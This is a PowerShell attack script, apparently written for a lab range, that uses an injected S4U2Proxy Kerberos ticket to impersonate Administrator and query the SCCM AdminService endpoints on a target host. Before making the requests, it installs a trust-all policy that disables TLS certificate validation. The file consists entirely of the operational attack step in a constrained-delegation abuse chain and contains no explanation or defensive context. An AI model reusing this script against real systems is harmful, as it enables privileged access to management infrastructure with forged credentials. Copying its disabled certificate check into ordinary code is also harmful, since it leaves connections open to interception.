# CD-chain presenter: use the injected S4U2Proxy ST (as Administrator) against the AdminService
# DefaultCredentials = use cached Kerberos ticket (NOT explicit NTLM creds).
$ErrorActionPreference = "Continue"
Add-Type -TypeDefinition @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy2 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy2
[System.Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

Write-Output "=== /AdminService/wmi/SMS_Site (default creds) ==="
try {
    $r = Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/wmi/SMS_Site" -UseDefaultCredentials -Method Get -TimeoutSec 25 -ErrorAction Stop
    Write-Output ("STATUS=" + $r.StatusCode)
    Write-Output ($r.Content.Substring(0, [Math]::Min(400, $r.Content.Length)))
} catch {
    $resp = $_.Exception.Response
    if ($resp) { Write-Output ("STATUS=" + [int]$resp.StatusCode) } else { Write-Output ("STATUS=ERR " + $_.Exception.Message) }
}

Write-Output "=== /AdminService/v1.0/ (default creds) ==="
try {
    $r2 = Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/v1.0/" -UseDefaultCredentials -Method Get -TimeoutSec 25 -ErrorAction Stop
    Write-Output ("STATUS2=" + $r2.StatusCode)
    Write-Output ($r2.Content.Substring(0, [Math]::Min(400, $r2.Content.Length)))
} catch {
    $resp = $_.Exception.Response
    if ($resp) { Write-Output ("STATUS2=" + [int]$resp.StatusCode) } else { Write-Output ("STATUS2=ERR " + $_.Exception.Message) }
}
Write-Output "DONE"
